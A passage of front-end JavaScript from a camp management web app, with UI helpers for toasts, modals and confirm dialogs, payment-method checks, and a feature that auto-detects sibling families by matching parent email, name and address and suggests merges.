    users:'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>',
    home:'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>',
    heart:'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.8 4.6a5.5 5.5 0 0 0-7.8 0L12 5.6l-1-1a5.5 5.5 0 0 0-7.8 7.8l1 1L12 21l7.8-7.8 1-1a5.5 5.5 0 0 0 0-7.8z"/></svg>',
    fileText:'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>',
    dollarSign:'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>',
    messageSquare:'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>',
    clock:'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>',
    list:'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>'
};
function ico(name){return _ICO[name]||'';}
function dtag(d){var c=(structure[d]&&structure[d].color)||'#94A3B8';return'<span class="div-tag" style="background:'+c+'10;color:'+c+'"><span class="div-dot" style="background:'+c+'"></span>'+esc(d)+'</span>'}
function fm(n){return'$'+Number(n||0).toLocaleString()}
// opts: {actionLabel, onAction} — an optional action button (e.g. "Undo").
// Gets a longer on-screen window than a plain toast so a real click can land.
function toast(m,t,opts){
    var el=document.getElementById('meToast');if(!el)return;
    el.className='me-toast '+(t==='error'?'bad':'ok')+' vis';
    document.getElementById('tI').textContent=t==='error'?'✕':'✓';
    document.getElementById('tM').textContent=m;
    var a=document.getElementById('tA');
    clearTimeout(el._t);
    if(a&&opts&&opts.actionLabel&&opts.onAction){
        a.textContent=opts.actionLabel;
        a.style.display='';
        a.onclick=function(){clearTimeout(el._t);el.classList.remove('vis');opts.onAction()};
        el._t=setTimeout(function(){el.classList.remove('vis')},6000);
    }else{
        if(a){a.style.display='none';a.onclick=null}
        el._t=setTimeout(function(){el.classList.remove('vis')},2600);
    }
}
function openModal(id){
    var e=document.getElementById(id); if(!e)return;
    e.classList.remove('closing'); // strip a pending close if reopened mid-animation
    e.style.display='flex';
}
function closeModal(id){
    var e=document.getElementById(id); if(!e||e.classList.contains('closing'))return;
    e.classList.add('closing');
    setTimeout(function(){
        if(!e.classList.contains('closing'))return; // openModal(id) fired again in the meantime
        if(id==='dynModal'){ if(e.parentNode)e.remove(); }
        else{ e.style.display='none'; }
        e.classList.remove('closing');
    },150);
}

// Small styled confirm dialog — returns a Promise<boolean>. Replaces native
// confirm() for destructive actions (e.g. Rescind), which reads as jarring/
// unstyled next to the rest of the app. `opts.message` is raw HTML (pre-
// escape any interpolated values yourself); `opts.danger` picks the red
// icon + solid-red confirm button vs the neutral amber "?" + primary button.
function confirmDialog(opts){
    opts=opts||{};
    return new Promise(function(resolve){
        var existing=document.getElementById('confirmDlgOverlay');
        if(existing)existing.remove();
        var danger=!!opts.danger;
        var overlay=document.createElement('div');
        overlay.id='confirmDlgOverlay';
        overlay.className='me-overlay';
        overlay.style.zIndex='10500';
        overlay.innerHTML=
            '<div class="me-modal me-confirm">'
            +'<div class="me-confirm-body">'
            +'<div class="me-confirm-icon me-confirm-icon--'+(danger?'danger':'warn')+'">'
            +(danger
                ? '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--err)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>'
                : '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--me)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>')
            +'</div>'
            +'<h3>'+esc(opts.title||'Are you sure?')+'</h3>'
            +'<p>'+(opts.message||'')+'</p>'
            +'</div>'
            +'<div class="me-modal-footer me-confirm-footer">'
            +'<button class="me-btn me-btn--sec" id="confirmDlgCancel">'+esc(opts.cancelLabel||'Cancel')+'</button>'
            +'<button class="me-btn '+(danger?'me-btn--danger-solid':'me-btn--pri')+'" id="confirmDlgOk">'+esc(opts.confirmLabel||'Confirm')+'</button>'
            +'</div>'
            +'</div>';
        document.body.appendChild(overlay);
        var settled=false;
        function finish(result){
            if(settled)return; settled=true;
            document.removeEventListener('keydown',onKey);
            overlay.classList.add('closing');
            setTimeout(function(){ if(overlay.parentNode)overlay.remove(); },150);
            resolve(result);
        }
        function onKey(ev){ if(ev.key==='Escape')finish(false); }
        overlay.addEventListener('mousedown',function(ev){ if(ev.target===overlay)finish(false); });
        document.getElementById('confirmDlgCancel').onclick=function(){finish(false);};
        document.getElementById('confirmDlgOk').onclick=function(){finish(true);};
        document.addEventListener('keydown',onKey);
        setTimeout(function(){ var okBtn=document.getElementById('confirmDlgOk'); if(okBtn)okBtn.focus(); },10);
    });
}

// Small overflow menu ("More"/"Share" buttons) — collapses a row of
// secondary actions into one button + dropdown instead of a wall of
// buttons. One outside-click listener (installed once) closes whichever
// menu is open.
function _toggleMenu(id){
    var menu=document.getElementById(id); if(!menu)return;
    var willOpen=!menu.classList.contains('open');
    _closeMenus();
    if(willOpen)menu.classList.add('open');
}
function _closeMenus(){
    document.querySelectorAll('.me-more-menu.open').forEach(function(m){m.classList.remove('open')});
}
if(!window._meMenuOutsideClickInit){
    window._meMenuOutsideClickInit=true;
    document.addEventListener('click',function(e){
        // A click on a menu ITEM closes the menu after its own onclick has
        // already fired (element listeners run before ancestor listeners in
        // the same bubble phase). A click on the trigger button is handled
        // by _toggleMenu itself. Anything else outside the menu closes it.
        if(e.target.closest('.me-more-menu')){ _closeMenus(); return; }
        if(e.target.closest('.me-more-wrap'))return;
        _closeMenus();
    });
}
function setupModals(){document.querySelectorAll('.me-overlay').forEach(function(o){o.addEventListener('mousedown',function(e){if(e.target===o)closeModal(o.id)})});
    var dz=document.getElementById('csvDZ'),fi=document.getElementById('csvFI');
    if(dz&&fi){dz.onclick=function(){fi.click()};dz.ondragover=function(e){e.preventDefault();dz.classList.add('dragover')};dz.ondragleave=function(){dz.classList.remove('dragover')};dz.ondrop=function(e){e.preventDefault();dz.classList.remove('dragover');handleCsv(e.dataTransfer.files[0])};fi.onchange=function(e){handleCsv(e.target.files[0])}}
}

// Dynamic modal helper — creates modal on the fly
var _dynModalCb=null;
function showModal(title,bodyHtml,onSave,opts){
    opts=opts||{};
    var existing=document.getElementById('dynModal');
    if(existing)existing.remove();
    var overlay=document.createElement('div');overlay.id='dynModal';
    overlay.className='me-overlay';overlay.style.cssText='position:fixed;inset:0;z-index:10000;background:rgba(0,0,0,.5);display:flex;align-items:center;justify-content:center;';
    var footer=onSave?'<div style="display:flex;justify-content:flex-end;gap:8px;padding:12px 20px;border-top:1px solid var(--s100)"><button class="me-btn me-btn--sec" onclick="CampistryMe.closeModal(\'dynModal\')">Cancel</button><button class="me-btn me-btn--pri" id="dynModalSave">Save</button></div>':'';
    overlay.innerHTML='<div style="background:#fff;border-radius:12px;max-width:'+(opts.maxWidth||560)+'px;width:95%;max-height:85vh;overflow:auto;box-shadow:0 20px 60px rgba(0,0,0,.25)"><div style="display:flex;justify-content:space-between;align-items:center;padding:16px 20px;border-bottom:1px solid var(--s100)"><h3 style="margin:0;font-size:1.05rem;font-weight:700">'+esc(title)+'</h3><button style="background:none;border:none;font-size:1.5rem;cursor:pointer;color:var(--s400)" onclick="CampistryMe.closeModal(\'dynModal\')">&times;</button></div><div style="padding:18px 22px">'+bodyHtml+'</div>'+footer+'</div>';
    document.body.appendChild(overlay);
    overlay.addEventListener('mousedown',function(e){if(e.target===overlay)closeModal('dynModal')});
    _dynModalCb=onSave||null;
    if(onSave){document.getElementById('dynModalSave').addEventListener('click',function(){if(_dynModalCb)_dynModalCb()})}
}

// Get all league names + teams from Flow
function getLeagues(){
    try{
        var g=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
        var leagues={};
        var reg=g.leaguesByName||{};
        Object.entries(reg).forEach(function([name,l]){if(l&&l.teams)leagues[name]=l.teams});
        var spec=g.specialtyLeagues||{};
        Object.values(spec).forEach(function(l){if(l&&l.name&&l.teams)leagues[l.name]=l.teams});
        return leagues;
    }catch(e){return{}}
}

// ── Section access gates ─────────────────────────────────────────
// A 'view' section renders but must refuse writes. campistry_access_sections.js
// disables controls broadly; these are the explicit checks on the handlers that
// actually move money, so a stale DOM can't get through.
function _secEdit(section,whatFor){
    var S=window.CampistrySections;
    if(!S)return true;
    return S.requireEdit(section,whatFor);
}
function _secCan(section){
    var S=window.CampistrySections;
    return S?S.can(section):true;
}

// ── Payment methods ──────────────────────────────────────────────
// The catalogue and the debit policy live in campistry_payments.js so
// registration, Billing, the canteen and the shop can't drift apart.
function _payAPI(){ return window.CampistryPayments||null }
function _payOptions(ctx,selected){
    var P=_payAPI();
    if(!P) return '<option value="credit">Credit card</option><option value="check">Check</option><option value="cash">Cash</option>';
    return P.optionsHtml(ctx,selected);
}
/** A struck-through row for anything refused, so the gap reads as a decision. */
function _payBlockedNote(ctx){
    var P=_payAPI(); if(!P) return '';
    var blocked=P.blockedFor(ctx);
    if(!blocked.length) return '';
    return blocked.map(function(b){
        return '<p style="font-size:.68rem;color:var(--s400);margin:4px 0 0;line-height:1.5">'+
            '<span style="text-decoration:line-through">'+esc(b.label)+'</span> — '+esc(b.reason)+'. '+esc(b.detail)+'</p>';
    }).join('');
}
function _payAllowed(id,ctx){
    var P=_payAPI();
    return P?P.isAllowed(id,ctx):true;
}
function _payLabel(id){
    var P=_payAPI();
    if(!P) return id||'—';
    return P.label(P.normalizeLegacy(id));
}

function ff(label,id,val,type,opts){
    var h='<div class="fg"><label class="fl">'+esc(label)+'</label>';
    if(type==='select'&&opts)h+='<select id="'+id+'" class="fs">'+opts.map(function(o){return'<option value="'+esc(o)+'"'+(o===val?' selected':'')+'>'+( o||'—')+'</option>'}).join('')+'</select>';
    else if(type==='textarea')h+='<textarea id="'+id+'" class="fi" style="min-height:60px;resize:vertical">'+esc(val||'')+'</textarea>';
    else h+='<input type="'+(type||'text')+'" id="'+id+'" class="fi" value="'+esc(val||'')+'">';
    return h+'</div>';
}

// ═══ RENDERERS ═══════════════════════════════════════════════════
function render(p){
    var m={campers:renderCampers,camperdetail:renderCamperDetailPage,staffdetail:renderStaffDetailPage,structure:renderStructure,bunkbuilder:renderBB,families:renderFamiliesPage,registration:renderRegistrationPage,hiring:renderHiringPage,leads:renderLeads,billing:renderBilling,payroll:renderPayroll,analytics:renderAnalytics,reports:renderReports,printsheets:renderPrintSheets};
    if(m[p])m[p]();else renderSoon(p);
}

// ── FAMILIES ─────────────────────────────────────────────────────
// ── Family auto-detect ───────────────────────────────────────────
// Two campers are treated as the same family when at least 3 of these
// four details match (only non-empty values ever count as a match):
//   last name · address · parent email · parent name
// Campers are clustered with union-find, so a chain of matches pulls a
// whole family together even if no single pair shares all four.
var FAMILY_MATCH_THRESHOLD = 3;

function _famAddr(street, city, state, zip){
    return [street, city, state, zip].join(' ').toLowerCase().replace(/[^a-z0-9]/g, '');
}
function _famItemRaw(name, street, city, state, zip, parentName, parentEmail){
    var parts = (name || '').trim().split(/\s+/);
    var lastName = parts.length > 1 ? parts[parts.length - 1] : '';
    return {
        name: name, lastName: lastName, last: lastName.toLowerCase(),
        addr: _famAddr(street, city, state, zip),
        email: (parentEmail || '').trim().toLowerCase(),
        parent: (parentName || '').trim().toLowerCase()
    };
}
function _famItem(name, c){
    c = c || {};
    var it = _famItemRaw(name, c.street, c.city, c.state, c.zip, c.parent1Name, c.parent1Email);
    it.camper = c;
    return it;
}
// Find an existing family this camper belongs to — either it already lists
// them, or they match it on 3+ of {last name, address, email, parent name},
// or they share the exact same parent email (email alone is enough — two
// campers under the same parent email are the same family regardless of
// what else does or doesn't line up). Returns the family key, or null
// (caller should start a new family).
function _resolveFamilyKey(camperName, item){
    var match = null;
    Object.keys(families).forEach(function(fk){
        if(match) return;
        var f = families[fk];
        if((f.camperIds || []).indexOf(camperName) >= 0){ match = fk; return; }
        if(_famShouldLink(item, _famFieldsForExisting(f))) match = fk;
    });
    return match;
}
// How many of the four fields match between two records (empty fields
// on either side never count).
function _famMatchCount(a, b){
    var m = 0;
    if(a.last   && a.last   === b.last)   m++;
    if(a.addr   && a.addr   === b.addr)   m++;
    if(a.email  && a.email  === b.email)  m++;
    if(a.parent && a.parent === b.parent) m++;
    return m;
}
// The two rules that make two campers family: the same parent email alone
// (a household can have a nickname/typo'd last name or a P.O. box vs. street
// address and still obviously be the same family if the email matches), or
// 3-of-4 on {last name, address, email, parent name} when there's no shared
// email to go on.
function _famEmailMatches(a,b){ return !!(a.email && b.email && a.email===b.email); }
function _famShouldLink(a,b){ return _famEmailMatches(a,b) || _famMatchCount(a,b) >= FAMILY_MATCH_THRESHOLD; }
// Comparable fields for an existing family record.
function _famFieldsForExisting(f){
    var hh = (f.households && f.households[0]) || {};
    var p  = (hh.parents && hh.parents[0]) || {};
    return {
        last:   (f.name || '').toLowerCase().replace(/\s*family$/, '').trim(),
        addr:   String(hh.address || '').toLowerCase().replace(/[^a-z0-9]/g, ''),
        email:  (p.email || '').trim().toLowerCase(),
        parent: (p.name  || '').trim().toLowerCase()
    };
}

function detectFamilySuggestions(){
    var assignedCampers = new Set();
    Object.values(families).forEach(function(f){ (f.camperIds || []).forEach(function(n){ assignedCampers.add(n); }); });

    // Unassigned campers → comparable items
    var items = [];
    Object.entries(roster).forEach(function([name, c]){
        if(assignedCampers.has(name)) return;
        items.push(_famItem(name, c));
    });

    // Union-find: merge any two campers that match on >= threshold fields.
    var uf = items.map(function(_, i){ return i; });
    function find(i){ while(uf[i] !== i){ uf[i] = uf[uf[i]]; i = uf[i]; } return i; }
    for(var i = 0; i < items.length; i++){
        for(var j = i + 1; j < items.length; j++){
            if(_famShouldLink(items[i], items[j])) uf[find(i)] = find(j);
        }
    }
    var groups = {};
    items.forEach(function(it, i){ var r = find(i); (groups[r] = groups[r] || []).push(it); });

    var suggestions = [];
    Object.keys(groups).forEach(function(k){
        var grp = groups[k];
        if(grp.length < 2) return;
        // Confidence = the weakest link in the group (min pairwise match) —
        // but a shared email on its own is always high confidence, even if
        // it's the only thing that matched.
        var minMatch = 4, allEmailLinked = true;
        for(var a = 0; a < grp.length; a++){
            for(var b = a + 1; b < grp.length; b++){
                var mc = _famMatchCount(grp[a], grp[b]);
                if(mc < minMatch) minMatch = mc;
                if(!_famEmailMatches(grp[a], grp[b])) allEmailLinked = false;
            }
        }
        var rep = grp[0];
        suggestions.push({
            lastName: rep.lastName,
            campers: grp.map(function(g){ return g.name; }),
            address: [rep.camper.street, rep.camper.city, rep.camper.state, rep.camper.zip].filter(Boolean).join(', '),
            parent: rep.camper.parent1Name || '',
            parentPhone: rep.camper.parent1Phone || '',
            parentEmail: rep.camper.parent1Email || '',
            confidence: (minMatch >= 4 || allEmailLinked) ? 'high' : 'medium'
        });
    });

    // Unassigned campers that match an EXISTING family.
    var singleSuggestions = [];
    Object.entries(roster).forEach(function([name, c]){
        if(assignedCampers.has(name)) return;
        var it = _famItem(name, c);
        Object.entries(families).forEach(function([fk, f]){
            if((f.camperIds || []).indexOf(name) >= 0) return;
            if(_famShouldLink(it, _famFieldsForExisting(f))){
                singleSuggestions.push({ familyKey: fk, familyName: f.name, camperName: name });
            }
        });
    });

    // Two ALREADY-SEPARATE family records that now match each other — e.g.
    // siblings enrolled at different times whose applications didn't line up
    // closely enough at the time, or a parent's email only got added later.
    // Without this, "become a family" would only ever apply going forward;
    // families that already exist as duplicates would never reconcile.
    var mergeFamilies = [];
    var famKeys = Object.keys(families);
    for(var fi = 0; fi < famKeys.length; fi++){
        for(var fj = fi + 1; fj < famKeys.length; fj++){
            var fa = families[famKeys[fi]], fb = families[famKeys[fj]];
            if(_famShouldLink(_famFieldsForExisting(fa), _famFieldsForExisting(fb))){
                mergeFamilies.push({ keyA: famKeys[fi], nameA: fa.name, campersA: (fa.camperIds||[]).slice(),
                    keyB: famKeys[fj], nameB: fb.name, campersB: (fb.camperIds||[]).slice() });
            }
        }
    }

    return { newFamilies: suggestions, addToExisting: singleSuggestions, mergeFamilies: mergeFamilies };
}

function acceptFamilySuggestion(idx){
    var suggestions=detectFamilySuggestions().newFamilies;
    var s=suggestions[idx];if(!s) return;
    var famKey='fam_'+s.lastName.toLowerCase().replace(/[^a-z0-9]/g,'')+'_'+Date.now();
    var parents=[{name:s.parent||'',phone:s.parentPhone||'',email:s.parentEmail||'',relation:'Parent'}];
    families[famKey]={
        name:s.lastName+' Family',
        households:[{label:'Primary',parents:parents,address:s.address||'',billingContact:true}],
        camperIds:s.campers.slice(),
        balance:0,totalPaid:0,notes:'Auto-detected family'
    };
    save();renderFamiliesPage();toast(s.lastName+' Family created with '+s.campers.length+' campers');
}

function dismissFamilySuggestion(idx){
    // Store dismissed suggestions so they don't reappear
    var suggestions=detectFamilySuggestions().newFamilies;
    var s=suggestions[idx];if(!s) return;
    var dismissed=JSON.parse(localStorage.getItem('campistry_dismissed_fam_suggestions')||'[]');
    dismissed.push(s.campers.sort().join('|'));
    localStorage.setItem('campistry_dismissed_fam_suggestions',JSON.stringify(dismissed));
    renderFamiliesPage();toast('Suggestion dismissed');
}
function dismissMergeFamilies(keyA,keyB){
    var dismissed=JSON.parse(localStorage.getItem('campistry_dismissed_fam_suggestions')||'[]');
    dismissed.push([keyA,keyB].sort().join('|'));
    localStorage.setItem('campistry_dismissed_fam_suggestions',JSON.stringify(dismissed));
    renderFamiliesPage();toast('Suggestion dismissed');
}

function acceptAddToFamily(famKey,camperName){
    if(!families[famKey]) return;
    if(!families[famKey].camperIds) families[famKey].camperIds=[];
    if(families[famKey].camperIds.indexOf(camperName)<0) families[famKey].camperIds.push(camperName);
    save();renderFamiliesPage();toast(camperName+' added to '+families[famKey].name);
}

// Two family records that turn out to be the same household (same parent
// email, or 3-of-4 on name/address/parent) — folds B's campers into A and
// removes B. Keeps A's own name/household/balance; only camperIds merge.
function mergeFamilies(keyA,keyB){
    var a=families[keyA],b=families[keyB];
    if(!a||!b)return;
    a.camperIds=a.camperIds||[];
    (b.camperIds||[]).forEach(function(n){ if(a.camperIds.indexOf(n)<0)a.camperIds.push(n); });
    a.balance=(a.balance||0)+(b.balance||0);
    a.totalPaid=(a.totalPaid||0)+(b.totalPaid||0);
    delete families[keyB];
    save();renderFamiliesPage();toast(b.name+' merged into '+a.name);
}

// Body-only family bundles view — rendered INSIDE the Campers page (see
// renderCampers) as the "Families" tab, rather than as its own sidebar
// section. optHighlight is an optional camper name whose family card should
// be scrolled to and briefly highlighted (used by the "family" link on a
// camper row in the main list).
function _familyBundlesHtml(optHighlight){
    var e=Object.entries(families);

    // Detect family suggestions
    var suggestions=detectFamilySuggestions();
    var dismissed=JSON.parse(localStorage.getItem('campistry_dismissed_fam_suggestions')||'[]');
    var newFams=suggestions.newFamilies.filter(function(s){return dismissed.indexOf(s.campers.sort().join('|'))<0});
    var addToExisting=suggestions.addToExisting;
    var mergeFams=(suggestions.mergeFamilies||[]).filter(function(s){return dismissed.indexOf([s.keyA,s.keyB].sort().join('|'))<0});
    var totalSuggestions=newFams.length+addToExisting.length+mergeFams.length;

    // A family only matters when siblings need to share ONE bill/balance
    // and ONE Link login — a camper with no siblings works fine with just
    // their own parent1Name/Phone/Email fields on the Roster and never
    // needs a family record at all. That's the thing this page is easy to
    // miss, so it gets said outright instead of assumed.
    var h='<div class="sec-hd"><div><h2 class="sec-title">Families</h2><p class="sec-desc">Groups siblings into one household so they share a single bill and one parent login to Link · '+e.length+' household'+(e.length!==1?'s':'')+(totalSuggestions>0?' · <span style="color:var(--me);font-weight:700">'+totalSuggestions+' suggestion'+(totalSuggestions!==1?'s':'')+'</span>':'')+'</p></div><div class="sec-actions"><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.printFamilies()">🖨 Print</button><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.exportFamilyReport()">↓ Export</button><button class="me-btn me-btn--pri" onclick="CampistryMe.addFamily()">+ Add Family</button></div></div>';

    // Show suggestions banner
    if(newFams.length||addToExisting.length||mergeFams.length){
        h+='<div style="background:linear-gradient(135deg,#FFFBEB,#FEF3C7);border:1px solid #FDE68A;border-radius:var(--r2);padding:16px;margin-bottom:18px">';
        h+='<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="font-size:1.1rem">👨‍👩‍👧‍👦</span><span style="font-weight:700;font-size:.9rem;color:var(--s800)">Family Suggestions</span><span style="font-size:.75rem;color:var(--s500)">Same parent email, or 3+ of last name/address/parent name, means the same family</span></div>';

        // New family suggestions
        newFams.forEach(function(s,i){
            var confColor=s.confidence==='high'?'var(--ok)':s.confidence==='medium'?'var(--warn)':'var(--s400)';
            var confLabel=s.confidence==='high'?'High confidence':s.confidence==='medium'?'Medium':'Low';
            h+='<div style="display:flex;align-items:center;gap:12px;padding:10px 14px;background:#fff;border-radius:var(--r);margin-bottom:6px;border:1px solid var(--s200)">';
            h+='<div style="flex:1"><div style="font-weight:700;font-size:.875rem">'+esc(s.lastName)+' Family</div>';
            h+='<div style="font-size:.75rem;color:var(--s500);margin-top:2px">'+s.campers.map(function(n){return'<strong>'+esc(n)+'</strong>'}).join(', ');
            if(s.address) h+=' · '+esc(s.address);
            if(s.parent) h+=' · Parent: '+esc(s.parent);
            h+='</div></div>';
            h+='<span style="font-size:.65rem;font-weight:600;color:'+confColor+';background:'+confColor+'15;padding:2px 8px;border-radius:4px">'+confLabel+'</span>';
            h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.acceptFamilySuggestion('+i+')">Accept</button>';
            h+='<button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--s400)" onclick="CampistryMe.dismissFamilySuggestion('+i+')">Dismiss</button>';
            h+='</div>';
        });

        // Add-to-existing suggestions
        addToExisting.forEach(function(s){
            h+='<div style="display:flex;align-items:center;gap:12px;padding:10px 14px;background:#fff;border-radius:var(--r);margin-bottom:6px;border:1px solid var(--s200)">';
            h+='<div style="flex:1"><div style="font-size:.8rem"><strong>'+esc(s.camperName)+'</strong> may belong to <strong>'+esc(s.familyName)+'</strong></div></div>';
            h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.acceptAddToFamily(\''+je(s.familyKey)+'\',\''+je(s.camperName)+'\')">Add</button>';
            h+='</div>';
        });

        // Two already-separate family records that turn out to be the same
        // household — most often siblings whose applications came in far
        // enough apart, or with different-enough details, that they each
        // got their own family record at the time.
        mergeFams.forEach(function(s){
            h+='<div style="display:flex;align-items:center;gap:12px;padding:10px 14px;background:#fff;border-radius:var(--r);margin-bottom:6px;border:1px solid var(--s200)">';
            h+='<div style="flex:1"><div style="font-size:.8rem"><strong>'+esc(s.nameA)+'</strong> ('+s.campersA.map(esc).join(', ')+') and <strong>'+esc(s.nameB)+'</strong> ('+s.campersB.map(esc).join(', ')+') look like the same family</div></div>';
            h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.mergeFamilies(\''+je(s.keyA)+'\',\''+je(s.keyB)+'\')">Merge</button>';
            h+='<button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--s400)" onclick="CampistryMe.dismissMergeFamilies(\''+je(s.keyA)+'\',\''+je(s.keyB)+'\')">Dismiss</button>';
            h+='</div>';
        });

        h+='</div>';
    }

    if(!e.length&&!totalSuggestions){h+='<div class="me-empty"><h3>No families yet</h3><p>Only needed when siblings should share one bill and one Link login — a camper with no siblings works fine without one. Add a family to group siblings, or import campers and we\'ll suggest matches automatically.</p><button class="me-btn me-btn--pri" onclick="CampistryMe.addFamily()">+ Add Family</button></div>'}
    else e.forEach(function([id,f]){
        var sb=f.balance>0?bdg(fm(f.balance)+' due','err'):f.totalPaid>0?bdg('Paid','ok'):bdg('Pending','warn');
        var isHighlight=optHighlight&&(f.camperIds||[]).indexOf(optHighlight)>=0;
        h+='<div class="fam-card" id="famcard-'+je(id)+'"'+(isHighlight?' style="box-shadow:0 0 0 2px var(--me)"':'')+'><div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px"><div><div style="font-size:.95rem;font-weight:600;color:var(--s800)">'+esc(f.name)+'</div><div style="font-size:.75rem;color:var(--s400)">'+(f.camperIds||[]).length+' camper'+((f.camperIds||[]).length!==1?'s':'')+'</div></div><div style="display:flex;gap:6px;align-items:center">'+sb+'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.editFamily(\''+je(id)+'\')">Edit</button><button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.deleteFamily(\''+je(id)+'\')" style="color:var(--err)">Delete</button></div></div>';
        (f.households||[]).forEach(function(hh){
            h+='<div class="hh"><div style="font-size:.65rem;font-weight:600;color:var(--s400);text-transform:uppercase;letter-spacing:.06em;margin-bottom:3px">'+esc(hh.label||'Primary')+(hh.billingContact?' · Billing':'')+'</div>';
            (hh.parents||[]).forEach(function(p){h+='<div style="font-size:.8rem;margin-bottom:2px"><strong>'+esc(p.name)+'</strong>'+(p.phone?' — <a href="tel:'+esc(p.phone)+'" style="color:var(--me)">'+esc(p.phone)+'</a>':'')+'</div>'});
            if(hh.address)h+='<div style="font-size:.7rem;color:var(--s400);margin-top:2px">'+esc(hh.address)+'</div>';
            h+='</div>';
        });
        h+='<div style="display:flex;gap:4px;flex-wrap:wrap;margin-top:8px">';
        (f.camperIds||[]).forEach(function(cn){h+='<span style="display:inline-flex;align-items:center;gap:4px;padding:3px 5px 3px 8px;border-radius:6px;border:1px solid var(--s200);font-size:.7rem;font-weight:600"><span style="cursor:pointer" onclick="CampistryMe.viewCamper(\''+je(cn)+'\')">'+esc(cn.split(' ')[0])+'</span><button title="Remove from family" onclick="event.stopPropagation();CampistryMe.removeCamperFromFamily(\''+je(id)+'\',\''+je(cn)+'\')" style="border:none;background:none;cursor:pointer;color:var(--s400);font-size:.9rem;line-height:1;padding:0 1px">&times;</button></span>'});
        h+='</div></div>';
    });
    return h;
}
function _familyForCamper(camperName){
    var found=null;
    Object.entries(families).forEach(function(pair){
        if(found)return;
        if((pair[1].camperIds||[]).indexOf(camperName)>=0)found={id:pair[0],name:pair[1].name};
    });
    return found;
}
function viewFamilyFromCamper(camperName){
    _famHighlight=camperName;
    nav('families');
}
// Families is its own top-level sidebar entry (same me.campers capability
// gate as the Roster, since a family groups the same campers) — previously
// a tab shared with Roster, split out the same way Registration/Hiring
// were, so it's reachable directly instead of a second click inside Roster.
function renderFamiliesPage(){
    var c=document.getElementById('page-families');
    if(!c)return;
    if(!_secCan('me.campers')){
        c.innerHTML='<div class="me-empty"><h3>No access to Families</h3><p>Your account isn\'t set up to open this section.</p></div>';
        return;
    }
    var highlight=_famHighlight; _famHighlight=null;
    c.innerHTML=_familyBundlesHtml(highlight);
    if(highlight){
        var fam=_familyForCamper(highlight);
        if(fam){
            var el=document.getElementById('famcard-'+fam.id);
            if(el)el.scrollIntoView({behavior:'smooth',block:'center'});
        }
    }
}
// Registration and Hiring are now two separate top-level sidebar entries
// under Operations, matching CampMinder's separate-products approach —
// _renderRegistrationPane()/_renderHiringPane() each carry their own
// me.enrollment/me.staffing gating internally.
function renderRegistrationPage(){
    var c=document.getElementById('page-registration');
    if(!c)return;
    c.innerHTML=_renderRegistrationPane();
}
function renderHiringPage(){
    var c=document.getElementById('page-hiring');
    if(!c)return;
    c.innerHTML=_renderHiringPane();
}

// Family create/edit
function openFamilyForm(id){
    editingFam=id;
    var f=id?families[id]:{name:'',households:[{label:'Primary',parents:[{name:'',phone:'',email:'',relation:'Mother'}],address:'',billingContact:true}],camperIds:[],balance:0,totalPaid:0,notes:''};
    document.getElementById('fmTitle').textContent=id?'Edit Family':'Add Family';
